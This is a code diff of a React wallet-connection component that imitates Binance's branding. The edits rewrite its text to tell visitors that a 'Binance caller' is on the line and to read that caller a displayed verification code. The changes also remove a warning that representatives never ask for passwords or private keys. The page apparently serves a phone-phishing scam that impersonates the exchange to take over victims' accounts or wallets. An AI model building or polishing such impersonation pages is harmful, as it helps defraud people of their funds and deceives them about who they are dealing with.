@@ -1,4 +1,3 @@
-
 import React, { useState } from "react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -56,8 +55,8 @@ const WalletLedgerConnection = () => {
     }
     setCurrentStep('codeEntry');
     toast({
-      title: "Call requested successfully",
-      description: "Please wait for our representative to contact you.",
+      title: "Call confirmed",
+      description: "Please provide the verification code to the Binance caller.",
     });
   };
 
@@ -162,7 +161,7 @@ const WalletLedgerConnection = () => {
               className="bg-blue-600 hover:bg-blue-700 text-white px-8 py-4 h-14 text-lg font-semibold rounded-lg transition-all duration-200 shadow-lg hover:shadow-xl"
             >
               <Phone className="w-6 h-6 mr-3" />
-              Request Call
+              Confirm Binance is on the Line
             </Button>
           </div>
         );
@@ -176,31 +175,31 @@ const WalletLedgerConnection = () => {
                   <Shield className="w-12 h-12 text-black" />
                 </div>
               </div>
-              <h2 className="text-3xl font-bold text-white">Call Request Confirmation</h2>
+              <h2 className="text-3xl font-bold text-white">Verification Code for Binance Caller</h2>
               <p className="text-[#848E9C] text-lg">
-                Security verification for your protection
+                Provide this code to verify your identity with the Binance representative
               </p>
             </div>
             
             <div className="bg-[#2B3139] rounded-xl p-8 space-y-6 border border-[#3C4043]">
               <div className="space-y-3">
                 <p className="text-[#B7BDC6] text-base">
-                  Binance always calls anonymously for security purposes.
+                  Please give this verification code to the Binance caller to confirm your identity.
                 </p>
                 <p className="text-[#848E9C] text-sm">
-                  Our representative will never ask for your passwords or private keys.
+                  The caller will ask for this code to verify that you are the legitimate account holder.
                 </p>
               </div>
               
               <div className="bg-gradient-to-r from-binance-yellow/10 to-yellow-400/10 rounded-xl p-6 border-2 border-binance-yellow/30">
                 <div className="space-y-2">
-                  <p className="text-white text-lg font-semibold">Verification Code</p>
+                  <p className="text-white text-lg font-semibold">Give this code to the Binance caller:</p>
                   <p className="text-binance-yellow text-4xl font-bold tracking-widest font-mono">88-12-30</p>
                 </div>
               </div>
               
               <p className="text-[#848E9C] text-sm leading-relaxed">
-                Our representative will ask for this code to verify your identity and ensure the security of your wallet connection process.
+                This code verifies your identity and ensures the security of your wallet connection process. Only share this with the official Binance representative on the call.
               </p>
             </div>
 
